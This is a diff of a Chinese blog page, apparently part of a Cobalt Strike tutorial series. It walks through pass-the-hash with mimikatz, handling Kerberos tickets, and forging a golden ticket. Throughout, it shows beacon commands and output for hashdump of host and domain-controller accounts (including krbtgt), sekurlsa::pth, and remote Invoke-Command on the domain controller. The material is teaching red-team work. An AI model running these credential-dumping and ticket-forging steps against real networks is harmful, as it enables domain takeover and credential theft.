@@ -426,7 +426,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    830
+                    835
                 </div>
                 
 
@@ -450,39 +450,90 @@
             <div id="articleContent">
                 <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>继续上一节密码哈希的部分，在上一节中讲到了使用密码生成用户的令牌，从而取得系统的信任，这一节将介绍使用密码的哈希值来取得系统的信任。</p>
 <h1 id="0x01-密码哈希"><a href="#0x01-密码哈希" class="headerlink" title="0x01 密码哈希"></a>0x01 密码哈希</h1><p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: <span class="number">82501</span> bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:<span class="number">500</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Daniel:<span class="number">1000</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Guest:<span class="number">501</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TeamsSix:<span class="number">1002</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; hashdump
+[*] Tasked beacon to dump hashes
+[+] host called home, sent: 82501 bytes
+[+] received password hashes:
+Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
+Daniel:1000:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
+Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::
+TeamsSix:1002:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::</code></pre>
 <p>使用 <code>pth</code> 获取信任</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; pth TEAMSSIX\Administrator <span class="number">12</span>cb161bvca930994x00cbc0aczf06d1</span><br><span class="line">[+] host called home, sent: <span class="number">23</span> bytes</span><br><span class="line">[*] Tasked beacon to run mimikatz<span class="string">&#x27;s sekurlsa::pth /user:Administrator /domain:TEAMSSIX /ntlm:12cb161bvca930994x00cbc0aczf06d1 /run:&quot;%COMSPEC% /c echo ade660d8dce &gt; \\.\pipe\8d3e4c&quot; command</span></span><br><span class="line"><span class="string">[+] host called home, sent: 750600 bytes</span></span><br><span class="line"><span class="string">[+] host called home, sent: 71 bytes</span></span><br><span class="line"><span class="string">[+] Impersonated NT AUTHORITY\SYSTEM</span></span><br><span class="line"><span class="string">[+] received output:</span></span><br><span class="line"><span class="string">user	: Administrator</span></span><br><span class="line"><span class="string">domain	: TEAMSSIX</span></span><br><span class="line"><span class="string">program	: C:\Windows\system32\cmd.exe /c echo ade660d8dce &gt; \\.\pipe\8d3e4c</span></span><br><span class="line"><span class="string">impers.	: no</span></span><br><span class="line"><span class="string">NTLM	: 12cb161bvca930994x00cbc0aczf06d1</span></span><br><span class="line"><span class="string">  |  PID  2992</span></span><br><span class="line"><span class="string">  |  TID  5028</span></span><br><span class="line"><span class="string">  |  LSA Process is now R/W</span></span><br><span class="line"><span class="string">  |  LUID 0 ; 14812112 (00000000:00e203d0)</span></span><br><span class="line"><span class="string">  \_ msv1_0   - data copy @ 0000000001794E80 : OK !</span></span><br><span class="line"><span class="string">  \_ kerberos - data copy @ 000000000044A188</span></span><br><span class="line"><span class="string">   \_ aes256_hmac       -&gt; null             </span></span><br><span class="line"><span class="string">   \_ aes128_hmac       -&gt; null             </span></span><br><span class="line"><span class="string">   \_ rc4_hmac_nt       OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_old      OK</span></span><br><span class="line"><span class="string">   \_ rc4_md4           OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_nt_exp   OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_old_exp  OK</span></span><br><span class="line"><span class="string">   \_ *Password replace @ 00000000017DA1E8 (16) -&gt; null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">beacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;</span></span><br><span class="line"><span class="string">[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;</span></span><br><span class="line"><span class="string">[+] host called home, sent: 231 bytes</span></span><br><span class="line"><span class="string">[+] received output:</span></span><br><span class="line"><span class="string">teamssix\administrator</span></span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">beacon&gt; pth TEAMSSIX\Administrator 12cb161bvca930994x00cbc0aczf06d1
+[+] host called home, sent: 23 bytes
+[*] Tasked beacon to run mimikatz&#39;s sekurlsa::pth /user:Administrator /domain:TEAMSSIX /ntlm:12cb161bvca930994x00cbc0aczf06d1 /run:&quot;%COMSPEC% /c echo ade660d8dce &gt; \\.\pipe\8d3e4c&quot; command
+[+] host called home, sent: 750600 bytes
+[+] host called home, sent: 71 bytes
+[+] Impersonated NT AUTHORITY\SYSTEM
+[+] received output:
+user    : Administrator
+domain    : TEAMSSIX
+program    : C:\Windows\system32\cmd.exe /c echo ade660d8dce &gt; \\.\pipe\8d3e4c
+impers.    : no
+NTLM    : 12cb161bvca930994x00cbc0aczf06d1
+  |  PID  2992
+  |  TID  5028
+  |  LSA Process is now R/W
+  |  LUID 0 ; 14812112 (00000000:00e203d0)
+  \_ msv1_0   - data copy @ 0000000001794E80 : OK !
+  \_ kerberos - data copy @ 000000000044A188
+   \_ aes256_hmac       -&gt; null             
+   \_ aes128_hmac       -&gt; null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 00000000017DA1E8 (16) -&gt; null
 
+beacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;
+[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;
+[+] host called home, sent: 231 bytes
+[+] received output:
+teamssix\administrator</code></pre>
 <h1 id="0x02-Kerberos-票据"><a href="#0x02-Kerberos-票据" class="headerlink" title="0x02 Kerberos 票据"></a>0x02 Kerberos 票据</h1><p>关于 Kerberos 的介绍可以查看知乎上的一篇文章，比较形象生动，文章地址： <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p>
 <p>查看有哪些 Kerberos 票据</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">shell klist</code></pre>
 <p>除去 kerberos 票据</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">kerberos_ticket_purge</code></pre>
 <p>加载 kerberos 票据</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use [/<span class="type">path</span>/<span class="type">to</span>/<span class="type">file.ticket</span>]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">kerberos_ticket_use [/path/to/file.ticket]</code></pre>
 <h1 id="0x03-黄金票据"><a href="#0x03-黄金票据" class="headerlink" title="0x03 黄金票据"></a>0x03 黄金票据</h1><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p>
 <p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p>
 <p><strong>1、目标的用户名及域名</strong></p>
 <p><strong>2、域的 SID 值</strong></p>
 <p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami /user</span><br><span class="line">[*] Tasked beacon to run: whoami /user</span><br><span class="line">[+] host called home, sent: <span class="number">43</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名        SID                                         </span><br><span class="line">============= ============================================</span><br><span class="line">teamssix\daniel S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-5311978431</span><span class="literal">-183514165</span><span class="literal">-284342044</span><span class="literal">-1000</span></span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">beacon&gt; shell whoami /user
+[*] Tasked beacon to run: whoami /user
+[+] host called home, sent: 43 bytes
+[+] received output:
 
+用户信息
+----------------
+
+用户名        SID                                         
+============= ============================================
+teamssix\daniel S-1-5-21-5311978431-183514165-284342044-1000</code></pre>
 <p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p>
 <p><strong>3、DC 中  KRBTGT  用户的 NTLM 哈希</strong></p>
 <p>DC 中  KRBTGT  用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: <span class="number">82501</span> bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:<span class="number">500</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Guest:<span class="number">501</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:<span class="number">502</span>:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::</span><br><span class="line">daniel:<span class="number">1108</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; hashdump
+[*] Tasked beacon to dump hashes
+[+] host called home, sent: 82501 bytes
+[+] received password hashes:
+Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
+Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::
+daniel:1108:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::</code></pre>
 <p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs18-1.png"></p>
 <p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式。</p>
 <p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WinDC <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WinDC <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">203</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">teamssix\administrator</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;
+[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;
+[+] host called home, sent: 203 bytes
+[+] received output:
+teamssix\administrator</code></pre>
 <blockquote>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
@@ -920,7 +971,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
